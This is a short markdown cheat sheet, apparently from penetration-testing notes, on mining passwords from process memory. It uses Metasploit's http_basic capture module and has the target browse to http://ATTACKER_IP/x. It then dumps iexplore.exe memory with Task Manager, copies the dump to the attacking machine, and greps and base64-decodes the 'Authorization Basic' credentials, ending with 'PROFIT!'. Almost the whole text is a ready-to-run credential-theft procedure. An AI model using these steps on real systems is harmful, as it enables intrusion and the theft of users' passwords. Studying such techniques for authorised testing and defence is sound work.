# Password Mining - Memory

## Steps:

#### 1: 

    msfconsole

#### 2: 

    use auxiliary/server/capture/http_basic

#### 3: 

    set uripath x

#### 4: 

    run

#### 5: On target, browse to http://ATTACKER_IP/x

#### 6: 

    taskmgr

#### 7: Right-click "iexplore.exe" in the "Image Name" abd select "Create Dump File"

#### 8: Copy dump file to attacking machine

#### 9: 

    Strings /path/to/dumpfile | grep "Authorization Basic"

#### 10: 

    echo -ne BASE64 STRING | base64 -d

#### 11: PROFIT!
